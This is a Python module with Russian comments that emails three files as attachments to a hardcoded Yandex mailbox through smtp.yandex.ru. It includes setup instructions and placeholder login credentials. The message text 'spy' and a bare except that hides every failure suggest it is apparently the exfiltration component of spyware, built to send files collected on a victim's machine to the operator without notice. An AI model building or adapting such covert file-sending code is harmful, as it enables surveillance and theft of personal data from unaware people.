import threading
import time
import mimetypes
import os
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import smtplib
def send_mail(filepath1,filepath2,filepath3):
#------------------ЭТО МЕНЯТЬ--------------------#
# В ЯНДЕКСЕ: настройки->все настройки->почтовые программы->ставим везде галочки
    msg = MIMEMultipart()
    to_email = '123@yandex.ru' #указываем ту почту, с которым мы залогинились
    message = 'spy'
    from_email = '123@yandex.ru' #логинимся на почту (желательно яндекс)
    password = '12345671' #пароль
    msg.attach(MIMEText(message, 'plain'))
#---------------------------------------------------#

    def attach_file(msg, filepath):                             # Функция по добавлению конкретного файла к сообщению
        filename = os.path.basename(filepath)                   # Получаем только имя файла
        ctype, encoding = mimetypes.guess_type(filepath)        # Определяем тип файла на основе его расширения
        if ctype is None or encoding is not None:               # Если тип файла не определяется
            ctype = 'application/octet-stream'                  # Будем использовать общий тип
        maintype, subtype = ctype.split('/', 1)                 # Получаем тип и подтип
        if maintype == 'text':                                  # Если текстовый файл
            with open(filepath) as fp:                          # Открываем файл для чтения
                file = MIMEText(fp.read(), _subtype=subtype)    # Используем тип MIMEText
                fp.close()                                      # После использования файл обязательно нужно закрыть
        elif maintype == 'image':  # Если изображение
            with open(filepath, 'rb') as fp:
                file = MIMEImage(fp.read(), _subtype=subtype)
                fp.close()
        else:                                                   # Неизвестный тип файла
            with open(filepath, 'rb') as fp:
                file = MIMEBase(maintype, subtype)              # Используем общий MIME-тип
                file.set_payload(fp.read())                     # Добавляем содержимое общего типа (полезную нагрузку)
                fp.close()
                encoders.encode_base64(file)                    # Содержимое должно кодироваться как Base64
        file.add_header('Content-Disposition', 'attachment', filename=filename) # Добавляем заголовки
        msg.attach(file)                                        # Присоединяем файл к сообщению

    try:
        attach_file(msg, filepath1)
        attach_file(msg,filepath2)
        attach_file(msg, filepath3)
        #----------------Если не хотите яндекс,то меняем здесь, но gmail работать не будет
        server = smtplib.SMTP('smtp.yandex.ru', 587)
        # --------------------------------------------------------------------------------
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email,msg.as_string())
        server.quit()
    except:
        pass
